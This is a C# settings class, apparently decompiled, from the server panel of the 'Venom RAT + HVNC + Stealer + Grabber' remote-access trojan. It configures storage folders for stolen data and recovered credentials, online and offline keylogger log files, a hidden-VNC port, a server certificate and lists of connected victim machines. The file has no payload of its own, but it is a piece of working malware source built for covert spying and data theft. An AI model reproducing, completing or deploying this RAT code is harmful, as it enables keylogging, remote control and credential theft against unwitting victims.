using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using Server.Connection;

namespace Server;

public static class Settings
{
	public static GROUP_TYPE groupby = GROUP_TYPE.NONE;

	public const string DATA_DIR = "ClientsFolder";

	public const string RECOVERY_DIR = "Recovery";

	public const string GRAB_DIR = "VenomStealer";

	public const string NOTE_FILE = "note.json";

	public const string OnlineKeyLogFile = "online_keylog.log";

	public const string OfflineKeyLogFile = "offline_keylog.log";

	public const string InstalledAppsFile = "installed.json";

	public static List<string> Blocked = new List<string>();

	public static object LockBlocked = new object();

	public static object LockReceivedSendValue = new object();

	public static string CertificatePath = Application.StartupPath + "\\VenomServer.p12";

	public static X509Certificate2 VenomServer;

	public static readonly string Version = "Venom RAT + HVNC + Stealer + Grabber  v6.0.3";

	public static object LockListviewClients = new object();

	public static object LockListviewLogs = new object();

	public static object LockListviewThumb = new object();

	public static bool ReportWindow = false;

	public static List<Clients> ReportWindowClients = new List<Clients>();

	public static object LockReportWindowClients = new object();

	public static int HvncPort = 4448;

	public static object lockclients = new object();

	public static List<Clients> connectedClients = new List<Clients>();

	public static long SentValue { get; set; }

	public static long ReceivedValue { get; set; }

	public static List<ClientInfo> connectedClientInfo
	{
		get
		{
			try
			{
				return connectedClients.Select((Clients cl) => cl.info).ToList();
			}
			catch
			{
			}
			return new List<ClientInfo>();
		}
	}
}
